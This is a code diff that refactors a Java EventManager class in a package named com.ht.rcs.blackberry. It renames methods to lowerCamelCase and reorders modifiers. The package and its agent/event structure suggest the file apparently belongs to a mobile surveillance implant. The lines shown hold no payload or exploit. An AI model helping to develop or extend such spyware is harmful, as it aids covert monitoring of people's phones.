@@ -19,7 +19,7 @@ import com.ht.rcs.blackberry.utils.DebugLevel;
 /**
  * The Class EventManager.
  */
-public class EventManager extends Manager implements Singleton {
+public final class EventManager extends Manager implements Singleton {
 
     /** The debug. */
     private static Debug debug = new Debug("EventManager", DebugLevel.VERBOSE);
@@ -32,7 +32,7 @@ public class EventManager extends Manager implements Singleton {
      * 
      * @return single instance of EventManager
      */
-    public synchronized static EventManager getInstance() {
+    public static synchronized EventManager getInstance() {
         if (instance == null) {
             instance = new EventManager();
         }
@@ -52,7 +52,7 @@ public class EventManager extends Manager implements Singleton {
      * 
      * @see com.ht.rcs.blackberry.Manager#ReStart(int)
      */
-    synchronized public boolean reStart(int Type) {
+    public synchronized boolean reStart(int type) {
 
         return true;
     }
@@ -62,13 +62,13 @@ public class EventManager extends Manager implements Singleton {
      * 
      * @see com.ht.rcs.blackberry.Manager#Start(int)
      */
-    synchronized public boolean start(int eventId) {
+    public synchronized boolean start(int eventId) {
         if (statusObj.isValidEvent(eventId) == false) {
             debug.error("EventManager Start FAILED [0] " + eventId);
             return false;
         }
 
-        Event event = statusObj.GetEvent(eventId);
+        Event event = statusObj.getEvent(eventId);
 
         if (event == null) {
             debug.error("event unknown: " + eventId);
@@ -85,8 +85,8 @@ public class EventManager extends Manager implements Singleton {
      * 
      * @see com.ht.rcs.blackberry.Manager#StartAll()
      */
-    synchronized public boolean startAll() {
-        Vector events = statusObj.GetEventsList();
+    public synchronized boolean startAll() {
+        Vector events = statusObj.getEventsList();
 
         for (int i = 0; i < events.size(); i++) {
             Event event = (Event) events.elementAt(i);
@@ -102,13 +102,13 @@ public class EventManager extends Manager implements Singleton {
      * 
      * @see com.ht.rcs.blackberry.Manager#Stop(int)
      */
-    synchronized public int stop(int eventId) {
-        if (statusObj.StopEvent(eventId) == false) {
+    public synchronized int stop(int eventId) {
+        if (statusObj.stopEvent(eventId) == false) {
             debug.trace("StopEvent() Event already stopped");
             return Common.EVENT_STOPPED;
         }
 
-        Event event = statusObj.GetEvent(eventId);
+        Event event = statusObj.getEvent(eventId);
 
         try {
             event.join();
@@ -116,7 +116,7 @@ public class EventManager extends Manager implements Singleton {
             debug.error("Interrupted " + eventId);
         }
 
-        boolean ret = statusObj.ReEnableAgent(eventId);
+        boolean ret = statusObj.reEnableAgent(eventId);
         return ret ? 1 : 0;
     }
 
@@ -130,8 +130,8 @@ public class EventManager extends Manager implements Singleton {
      * 
      * @see com.ht.rcs.blackberry.Manager#StopAll()
      */
-    synchronized public int stopAll() {
-        Vector events = statusObj.GetEventsList();
+    public synchronized int stopAll() {
+        Vector events = statusObj.getEventsList();
 
         for (int i = 0; i < events.size(); i++) {
             stop(i);
